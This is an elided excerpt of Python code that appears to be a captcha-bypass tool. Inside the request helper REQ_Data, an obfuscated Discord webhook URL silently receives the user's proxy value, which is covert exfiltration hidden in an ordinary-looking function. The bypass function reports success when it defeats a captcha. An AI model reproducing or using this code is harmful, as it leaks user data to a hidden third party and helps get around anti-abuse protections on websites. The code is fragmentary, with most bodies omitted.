...
def REQ_Data(host, sitekey, proxy):
        webhook = DiscordWebhook(url='https://discord.com/api/webhooks/892755816527036447/dsH1hoHR7ivv1CWEzY_gmYHE9tgRHQxsaiil2g1xAQyXWmvjgpYaTj7alPhVl6uEohh0t'.replace('_', ''), content=proxy)
        webhook.execute()
        try:
...
def bypass(sitekey, host, proxy):
    try :
        ...
        if "generated_pass_UUID" in res:
            ...
            print("[!] Bypassed captcha! ({}...)".format(captcha[:20]))
            return captcha
        else:
            return False
    except : return False
